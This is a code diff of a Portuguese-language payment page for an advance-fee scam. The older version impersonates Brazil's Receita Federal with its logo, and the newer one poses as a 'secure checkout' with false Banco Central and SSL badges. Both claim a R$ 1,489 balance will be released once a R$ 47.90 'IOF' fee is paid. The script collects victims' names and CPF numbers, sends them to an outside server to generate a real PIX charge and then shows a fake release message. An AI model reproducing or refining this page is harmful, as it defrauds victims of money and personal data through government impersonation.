@@ -3,270 +3,286 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Pagamento IOF | Receita Federal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+    <title>Finalizar Transferência</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     
     <style>
-        /* --- RESET E BASE --- */
+        :root {
+            --primary-blue: #0056b3; /* Azul Sóbrio/Bancário */
+            --action-green: #28a745; /* Verde Sucesso */
+            --bg-page: #f4f7f6; /* Fundo Clean */
+            --text-dark: #333333;
+            --text-gray: #6c757d;
+            --border-light: #e9ecef;
+        }
+
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
+
         body {
-            font-family: 'Roboto', sans-serif;
-            background: #f0f2f5; /* Fundo geral mais moderno */
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-page);
             margin: 0;
             display: flex;
             justify-content: center;
             min-height: 100vh;
-            padding: 20px 0; /* Espaço em cima e embaixo em telas grandes */
+            padding: 20px;
         }
 
-        /* --- CONTAINER PRINCIPAL (CARD) --- */
-        .container {
+        .checkout-card {
+            background: white;
             width: 100%;
-            max-width: 480px;
-            background: #fff;
-            border-radius: 16px; /* Bordas mais arredondadas */
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08); /* Sombra sofisticada */
+            max-width: 420px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05); /* Sombra suave */
             overflow: hidden;
             display: flex;
             flex-direction: column;
-            position: relative;
         }
 
-        /* --- HEADER AZUL RECEITA --- */
-        .header {
-            background-color: #003399; /* Azul Receita mais profundo */
-            padding: 25px 20px;
+        /* --- HEADER CLEAN --- */
+        .card-header {
+            background: white;
+            padding: 20px 25px;
+            border-bottom: 1px solid var(--border-light);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .brand-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            color: var(--primary-blue);
+            font-size: 14px;
+        }
+        .secure-badge {
+            background: #e8f5e9;
+            color: var(--action-green);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        /* --- CONTEÚDO --- */
+        .card-body {
+            padding: 25px;
+        }
+
+        .title-area {
             text-align: center;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 4px 12px rgba(0,51,153,0.2);
-        }
-        .logo-receita {
-            height: 45px; /* Logo um pouco maior */
-            filter: brightness(0) invert(1); /* Garante que fique branco */
-        }
-
-        .content { padding: 30px 25px; }
-
-        /* --- BOX DE AVISO --- */
-        .warning-box {
-            background-color: #fffdf0; /* Amarelo mais suave */
-            border-left: 5px solid #ffd700; /* Borda lateral de destaque */
-            color: #856404;
-            padding: 15px 20px;
-            border-radius: 8px;
-            font-size: 14px;
             margin-bottom: 25px;
-            display: flex;
-            gap: 15px;
-            align-items: center;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
         }
-        .warning-icon { font-size: 20px; }
+        .title-area h2 {
+            margin: 0 0 5px 0;
+            font-size: 18px;
+            color: var(--text-dark);
+        }
+        .title-area p {
+            margin: 0;
+            font-size: 13px;
+            color: var(--text-gray);
+        }
 
-        /* --- TÍTULOS E TEXTOS --- */
-        h1 {
-            font-size: 22px;
-            font-weight: 800;
-            color: #1a1a1a;
-            margin: 0 0 10px 0;
-            line-height: 1.2;
-        }
-        .description {
-            font-size: 14px;
-            color: #555;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-        .text-red { color: #d32f2f; font-weight: 600; }
-
-        /* --- CARD DE RESUMO FINANCEIRO --- */
-        .summary-box {
-            background: #fff;
-            border-radius: 12px;
-            border: 1px solid #eef0f2;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
-            margin-bottom: 30px;
-            overflow: hidden;
-        }
-        .summary-header {
+        /* --- RESUMO FINANCEIRO (Clean Table) --- */
+        .financial-summary {
             background: #f8f9fa;
-            padding: 15px 20px;
-            font-weight: 800;
-            font-size: 15px;
-            color: #333;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            border-bottom: 1px solid #eef0f2;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border-light);
         }
-        .summary-row {
+        
+        .row {
             display: flex;
             justify-content: space-between;
-            padding: 18px 20px;
-            font-size: 15px;
-            border-bottom: 1px solid #f0f0f0;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+        .row span:first-child { color: var(--text-gray); }
+        .row span:last-child { font-weight: 600; color: var(--text-dark); }
+        
+        .row.highlight {
+            margin-bottom: 0;
+            padding-top: 12px;
+            border-top: 1px dashed #d1d1d1;
             align-items: center;
         }
-        
-        /* Destaques de Valor */
-        .val-gain { font-weight: 600; color: #333; font-size: 16px; }
-        
-        .row-tax { background-color: #fff5f5; } /* Fundo avermelhado suave */
-        .val-tax { color: #d32f2f; font-weight: 800; font-size: 17px; }
-        .tax-desc { font-size: 12px; color: #d64949; display: block; margin-top: 4px; }
-
-        /* Total a Receber (Grande Destaque) */
-        .row-total { background-color: #f0fff4; border-bottom: none; } /* Fundo esverdeado suave */
-        .label-total { font-weight: 800; font-size: 16px; color: #1a1a1a; text-transform: uppercase; }
-        .val-total { font-weight: 900; font-size: 24px; color: #00c853; } /* Valor Grande Verde */
-
-        /* Informação do Pix */
-        .pix-info {
-            background: #fafafa;
-            padding: 12px 20px;
-            font-size: 12px;
-            color: #666;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            border-top: 1px solid #eef0f2;
-            font-weight: 500;
+        .row.highlight span:first-child { color: var(--text-dark); font-weight: 600; }
+        .row.highlight .total-price {
+            color: var(--action-green);
+            font-size: 20px;
+            font-weight: 700;
         }
 
-        /* --- FORMULÁRIO --- */
-        .input-hidden-group { margin-bottom: 25px; }
+        .tax-note {
+            font-size: 11px;
+            color: #dc3545; /* Vermelho suave para alerta */
+            background: #fff5f5;
+            padding: 8px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid #ffeeba;
+        }
+
+        /* --- INPUTS --- */
+        .form-group { margin-bottom: 15px; }
         .form-label {
-            font-size: 13px; font-weight: 700; color: #444; display: block; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px;
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 6px;
         }
-        .input-field {
+        .form-input {
             width: 100%;
-            padding: 15px;
-            border: 2px solid #e0e0e0; /* Borda mais grossa e moderna */
-            border-radius: 8px;
-            font-size: 16px;
-            margin-bottom: 15px;
-            transition: 0.3s;
-            background: #fdfdfd;
-        }
-        .input-field:focus {
-            border-color: #003399; /* Foco azul receita */
+            padding: 12px;
+            border: 1px solid #ced4da;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: 0.2s;
             background: #fff;
         }
+        .form-input:focus {
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 3px rgba(0, 86, 179, 0.1);
+        }
 
-        /* --- BOTÃO DE AÇÃO --- */
-        .btn-pay {
-            background: linear-gradient(to bottom, #00d455, #00c853); /* Degradê sutil */
-            color: white;
+        /* --- BOTÃO --- */
+        .btn-success {
             width: 100%;
-            padding: 18px;
+            padding: 16px;
+            background-color: var(--action-green);
+            color: white;
             border: none;
             border-radius: 8px;
-            font-size: 17px;
-            font-weight: 800;
-            text-transform: uppercase;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0, 200, 83, 0.3); /* Sombra verde */
-            transition: 0.2s;
+            transition: background 0.2s;
+            margin-top: 10px;
+            box-shadow: 0 4px 10px rgba(40, 167, 69, 0.2);
         }
-        .btn-pay:active { transform: scale(0.99); box-shadow: 0 2px 5px rgba(0, 200, 83, 0.3); }
-        .btn-pay:disabled { background: #ccc; box-shadow: none; transform: none; cursor: not-allowed; }
+        .btn-success:active { transform: scale(0.98); }
+        .btn-success:disabled { background-color: #ccc; cursor: not-allowed; box-shadow: none; }
 
-        /* --- MODAL QR CODE (Mantido Funcional) --- */
-        #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 300; align-items: center; justify-content: center; padding: 20px; }
-        .qr-card { background: white; padding: 30px; border-radius: 16px; text-align: center; width: 100%; max-width: 380px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); }
-        .qr-img { width: 220px; margin: 20px auto; display: block; border-radius: 8px; border: 1px solid #eee; }
-        .pix-copia { background: #f0f2f5; padding: 15px; font-size: 12px; word-break: break-all; border-radius: 8px; margin-bottom: 20px; color: #555; border: 1px solid #e0e0e0; }
-
-        /* Responsividade para telas pequenas (remove margem do body) */
-        @media (max-width: 480px) {
-            body { padding: 0; }
-            .container { border-radius: 0; min-height: 100vh; }
+        /* --- FOOTER --- */
+        .footer-secure {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 11px;
+            color: #adb5bd;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
         }
+        .footer-secure img { height: 18px; filter: grayscale(100%); opacity: 0.6; }
+
+        /* --- MODAL QR CODE --- */
+        #qr-screen {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.95); z-index: 300; align-items: center; justify-content: center; padding: 20px;
+        }
+        .qr-card {
+            background: white; padding: 30px; border-radius: 12px; text-align: center; width: 100%; max-width: 360px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1); border: 1px solid #eee;
+        }
+        .qr-img { width: 200px; display: block; margin: 20px auto; border: 1px solid #eee; border-radius: 8px; }
+        .pix-code { background: #f8f9fa; padding: 12px; font-size: 11px; word-break: break-all; border-radius: 6px; margin-bottom: 20px; color: #555; }
+        
+        .status-msg { margin-top:20px; color: var(--action-green); font-weight: 700; display: none; }
+
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" alt="Receita Federal" class="logo-receita">
+    <div class="checkout-card">
+        <div class="card-header">
+            <div class="brand-area">
+                <svg width="20" height="20" fill="currentColor" viewBox="0 0 16 16"><path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2zM5 8h6a1 1 0 0 1 1 1v5a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V9a1 1 0 0 1 1-1z"/></svg>
+                CHECKOUT SEGURO
+            </div>
+            <div class="secure-badge">
+                <svg width="10" height="10" fill="currentColor" viewBox="0 0 16 16"><path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/><path d="M10.97 4.97a.235.235 0 0 0-.02.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-1.071-1.05z"/></svg>
+                Ambiente Criptografado
+            </div>
         </div>
 
-        <div class="content">
-            
-            <div class="warning-box">
-                <span class="warning-icon">⚠️</span>
-                <div><strong>Atenção: Imposto (IOF) obrigatório pendente.</strong></div>
+        <div class="card-body">
+            <div class="title-area">
+                <h2>Liberação de Valores</h2>
+                <p>Finalize o pagamento da taxa para transferir o saldo.</p>
             </div>
 
-            <h1>Imposto sobre Operações Financeiras (IOF)</h1>
-            
-            <p class="description">
-                Para a liberação do saldo acumulado, a legislação vigente (Lei nº 8.894/94) exige a quitação do IOF.<br><br>
-                <span class="text-red">O não pagamento impede a transferência imediata do valor para sua conta.</span>
-            </p>
-
-            <div class="summary-box">
-                <div class="summary-header">Resumo da Operação</div>
-                
-                <div class="summary-row">
-                    <span>Saldo a liberar</span>
-                    <span class="val-gain">R$ 1.489,38</span>
+            <div class="financial-summary">
+                <div class="row">
+                    <span>Saldo em conta</span>
+                    <span>R$ 1.489,38</span>
                 </div>
-
-                <div class="summary-row row-tax">
-                    <div>
-                        <span>Valor do IOF (Imposto)</span>
-                        <span class="tax-desc">Taxa única de regularização</span>
-                    </div>
-                    <span class="val-tax">- R$ 47,90</span>
+                <div class="row">
+                    <span>Taxa Administrativa (IOF)</span>
+                    <span style="color: #dc3545;">R$ 47,90</span>
                 </div>
-
-                <div class="summary-row row-total">
-                    <span class="label-total">Valor Líquido a Receber</span>
-                    <span class="val-total">R$ 1.489,38</span>
-                </div>
-
-                <div class="pix-info">
-                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/><path d="M7.002 11a1 1 0 1 1 2 0 1 1 0 0 1-2 0zM7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 4.995z"/></svg>
-                    Pagamento seguro processado via PIX do Banco Central.
+                <div class="row highlight">
+                    <span>Total a Pagar</span>
+                    <span class="total-price">R$ 47,90</span>
                 </div>
             </div>
 
-            <div class="input-hidden-group">
-                <label class="form-label">Nome do Contribuinte</label>
-                <input type="text" id="nome" class="input-field" placeholder="Digite seu nome completo">
-                <label class="form-label">CPF do Titular</label>
-                <input type="tel" id="cpf" class="input-field" placeholder="000.000.000-00" maxlength="14" oninput="mask(this)">
+            <div class="tax-note">
+                Pagamento único. O valor do saldo será liberado imediatamente após a confirmação.
             </div>
 
-            <button class="btn-pay" onclick="gerarPixIOF()">PAGAR IOF E LIBERAR VALOR</button>
+            <div class="form-group">
+                <label class="form-label">Nome Completo</label>
+                <input type="text" id="nome" class="form-input" placeholder="Titular da conta">
+            </div>
+            <div class="form-group">
+                <label class="form-label">CPF</label>
+                <input type="tel" id="cpf" class="form-input" placeholder="000.000.000-00" maxlength="14" oninput="mask(this)">
+            </div>
 
+            <button class="btn-success" onclick="gerarPixIOF()">
+                PAGAR TAXA E RECEBER
+            </button>
+
+            <div class="footer-secure">
+                <span>Site Seguro</span> • <span>Certificado SSL</span> • <span>Banco Central</span>
+            </div>
         </div>
     </div>
 
     <div id="qr-screen">
         <div class="qr-card">
-            <h3 style="margin-top:0; color:#333; font-weight:800;">Pagamento IOF</h3>
-            <p style="font-size:14px; color:#666;">Escaneie o QR Code abaixo para finalizar a regularização.</p>
+            <h3 style="margin-top:0;">Escaneie para Pagar</h3>
+            <p style="font-size:13px; color:#777;">Utilize o app do seu banco.</p>
+            
             <img id="qr-image" class="qr-img">
-            <div id="pix-copia" class="pix-copia"></div>
-            <button class="btn-pay" style="padding:12px; font-size:14px;" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
-            <div id="msg-sucesso" style="margin-top:20px; color:#00c853; font-weight:bold; display:none; font-size:16px;">
-                ✅ IMPOSTO PAGO!<br>Seu valor está sendo liberado.
+            
+            <div id="pix-copia" class="pix-code"></div>
+            
+            <button class="btn-success" style="padding:12px;" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
+            
+            <div id="msg-sucesso" class="status-msg">
+                PAGAMENTO APROVADO! 🚀<br>
+                <span style="font-size:12px; font-weight:normal; color:#555;">Seu saldo de R$ 1.489,38 foi liberado.</span>
             </div>
         </div>
     </div>
 
     <script>
-        // --- MANTENDO A MESMA LÓGICA FUNCIONAL ---
         const API_URL = "https://checkout-pix-profissional.onrender.com";
         function mask(i){ let v=i.value.replace(/\D/g,""); v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"); i.value=v; }
         
         async function gerarPixIOF() {
-            const n=document.getElementById('nome').value, c=document.getElementById('cpf').value.replace(/\D/g,''), b=document.querySelector('.btn-pay');
-            if(n.length<3||c.length<11) return alert("Preencha Nome e CPF do contribuinte.");
-            b.innerText="GERANDO GUIA..."; b.disabled=true;
+            const n=document.getElementById('nome').value, c=document.getElementById('cpf').value.replace(/\D/g,''), b=document.querySelector('.btn-success');
+            if(n.length<3||c.length<11) return alert("Preencha seus dados.");
+            b.innerText="PROCESSANDO..."; b.disabled=true;
             try {
                 const r=await fetch(`${API_URL}/pix`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:47.90,name:n,cpf:c})});
                 const d=await r.json();
@@ -275,11 +291,11 @@
                     document.getElementById('pix-copia').innerText=d.point_of_interaction.transaction_data.qr_code;
                     document.getElementById('qr-screen').style.display='flex';
                     monitor(d.id);
-                } else { alert("Erro ao gerar guia. Tente novamente."); b.disabled=false; b.innerText="PAGAR IOF E LIBERAR VALOR"; }
-            } catch(e){ alert("Erro de conexão."); b.disabled=false; b.innerText="PAGAR IOF E LIBERAR VALOR"; }
+                } else { alert("Erro ao gerar."); b.disabled=false; b.innerText="PAGAR TAXA E RECEBER"; }
+            } catch(e){ alert("Erro de conexão."); b.disabled=false; b.innerText="PAGAR TAXA E RECEBER"; }
         }
         function monitor(id){ setInterval(async()=>{ try{ const r=await fetch(`${API_URL}/pix/${id}`); const j=await r.json(); if(j.status==='approved'||j.status==='refunded'){ document.getElementById('msg-sucesso').style.display='block'; document.getElementById('qr-image').style.opacity=0.3; } }catch(e){} },3000); }
-        function copiarCodigo(){ navigator.clipboard.writeText(document.getElementById('pix-copia').innerText); alert("Código PIX copiado!"); }
+        function copiarCodigo(){ navigator.clipboard.writeText(document.getElementById('pix-copia').innerText); alert("Copiado!"); }
     </script>
 </body>
 </html>
